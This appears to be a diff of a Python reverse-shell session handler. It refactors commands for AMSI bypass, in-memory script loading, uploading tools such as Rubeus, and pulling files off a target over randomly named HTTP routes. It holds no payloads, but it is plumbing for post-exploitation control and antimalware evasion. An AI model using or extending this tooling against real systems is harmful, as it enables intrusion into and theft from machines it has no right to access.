@@ -21,7 +21,7 @@ class SessionCommand(AbstractCommand):
     """
 
     COMMANDS = {
-        "amsi_bypass" : {"shell": [ShellTypes.Powershell], "help": "Bypass amsi"},
+        "amsi_bypass" : {"shell": [ShellTypes.Powershell], "help": "Bypass amsi, by using the script in [bold red]config.ini[/bold red]"},
         "binaries"    : {"shell": ShellTypes, "help": "Display binaries available on the target"},
         "close"       : {"shell": ShellTypes, "help": "Close the connection"},
         "download"    : {"shell": ShellTypes, "help": "Download a file",
@@ -30,7 +30,7 @@ class SessionCommand(AbstractCommand):
         "help"        : {"shell": ShellTypes, "help": "Show this help, or help about a current command",
                                                 "usage": "help ?<[bold yellow]command[/bold yellow]>"},
         "info"        : {"shell": ShellTypes, "help": "Show info about the current session"},
-        "load"        : {"shell": [ShellTypes.Powershell], "help": "Load a shell script in memory"},
+        "load"        : {"shell": [ShellTypes.Powershell, ShellTypes.Basic, ShellTypes.Pty], "help": "Load a script in memory"},
         "reset"       : {"shell": [ShellTypes.Pty], "help": "Reset the terminal to [bold yellow]cooked[/bold yellow] mode"},
         "setraw"      : {"shell": [ShellTypes.Basic, ShellTypes.Powershell, ShellTypes.Windows], "help": "Equivalent to [bold]stty raw -echo[/bold]"},
         "scripts"     : {"shell": ShellTypes, "help": "Display available scripts in dedicated folder"},
@@ -41,10 +41,16 @@ class SessionCommand(AbstractCommand):
         }
 
     def __init__(self, session_in_use):
+        """
+        Init the class by giving it access to:
+         - The PayloadGenerator class to generate reverse shell
+         - The associated session
+         - The full_cli which is the command entered by the user
+        """
         self.session_in_use = session_in_use
         self.full_cli = None
-        self.init_session()
         self.generator = PayloadGenerator()
+        self.init_session()
 
     def init_session(self):
         """Init the prompt session with  the needed completer"""
@@ -79,11 +85,21 @@ class SessionCommand(AbstractCommand):
         """
         return self.session_in_use.connection.shell_type
 
+    @property
+    def primary_shell_type(self):
+        """
+        Return the primary shell associated to the shell type
+        Pty ==> either Basic or Powershell
+        """
+        if self.shell_type is ShellTypes.Pty:
+            return self.session_in_use.connection.shell_handler.previous_shell
+        return self.shell_type
+
     def __create_dir_if_not_exists(self, path):
         if not(os.path.exists(path)):
             os.makedirs(path)
 
-    def __create_route(self):
+    def __create_random_route(self):
         """Return the name for a route generated randomly"""
         return ObfUtil.get_random_string(21, ext=".log")
 
@@ -125,20 +141,19 @@ class SessionCommand(AbstractCommand):
 
     def execute_load(self, *args):
         """Load a script in memory, only available in powershell mode"""
-        if len(args) == 0:
+        if len(args) != 1:
             Printer.err("Load requires an argument")
         else:
-            script = self.__get_file(args[0])
+            script = MinishhUtils.get_file(args[0])
             if script is not None:
-                route = self.__create_route()
+                route = self.__create_random_route()
                 try:
                     self.session_in_use.download_server.notify_download(route, script)
                     Printer.log(f"Creating route {route} --> {script}")
-                    self.command_executor.exec(
-                        self.session_in_use.download_server.download_link_powershell(route),
-                        timeout=2.5,
-                        get_all=False,
-                        shell_type=self.shell_type
+                    self.command_executor.load(
+                        self.session_in_use.download_server.create_download_link(route),
+                        shell_type = self.primary_shell_type,
+                        available_bin = self.session_in_use.session_assets.binaries
                         )
 
                 except Exception:
@@ -202,14 +217,20 @@ class SessionCommand(AbstractCommand):
             Printer.err(f"Directory [red]{script_dir}[/red] is missing")
 
     def execute_download(self, *args):
-        if len(args) == 0:
-            Priner.err("Missing argument filepath")
+        if len(args) != 1:
+            Printer.err("Usage: download <file>")
         else:
             file = args[0]
             Printer.log(f"Downloading [dodger_blue1]{file}[/dodger_blue1]")
             download_directory = AppConfig.get("directory", "Download")
             self.__create_dir_if_not_exists(download_directory)
-            self.command_executor.download(file, download_directory, self.shell_type, self.session_in_use.session_assets.binaries)
+            route = self.__create_random_route()
+            HttpDeliveringServer.notify_upload(route, file)
+            self.command_executor.download(
+                self.session_in_use.download_server.create_download_link(route),
+                file,
+                self.primary_shell_type,
+                self.session_in_use.session_assets.binaries)
 
     def execute_upgrade(self, *args):
         cmdline = PtyUpgrade.get_tty_cmd(self.session_in_use.session_assets.binaries)
@@ -235,20 +256,33 @@ class SessionCommand(AbstractCommand):
             Printer.err("Cannot upgrade shell to [red]tty...[/red]")
 
     def execute_upload(self, *args):
+        """
+        Idea:
+        > upload rubeus.exe C:\\Windows\\Temp\\rubeus.exe
+        1. The process generate the payload for the shell type
+        2. A route is created for this file
+        3. Payload is sent to the remote target
+
+        ==> Same for download / load
+
+        route = create_route_for_file(file)
+        payload = ClassThatKnowsPayload.get_payload_for('upload', shell_type, route)
+        send(payload)
+        """
         if len(args) != 2:
             Printer.err("Missing argument to the [yellow]upload[/yellow] function")
         else:
-            filename = self.__get_file(args[0])
+            filename = MinishhUtils.get_file(args[0])
             if filename is not None:
                 where = args[1]
-                route = self.__create_route()
+                route = self.__create_random_route()
                 try:
                     self.session_in_use.download_server.notify_download(route, filename)
                     Printer.log(f"Creating route {route} --> {filename}")
                     self.command_executor.upload_http(
                             self.session_in_use.download_server.create_download_link(route),
                             where,
-                            self.shell_type,
+                            self.primary_shell_type,
                             self.session_in_use.session_assets.binaries
                             )
 
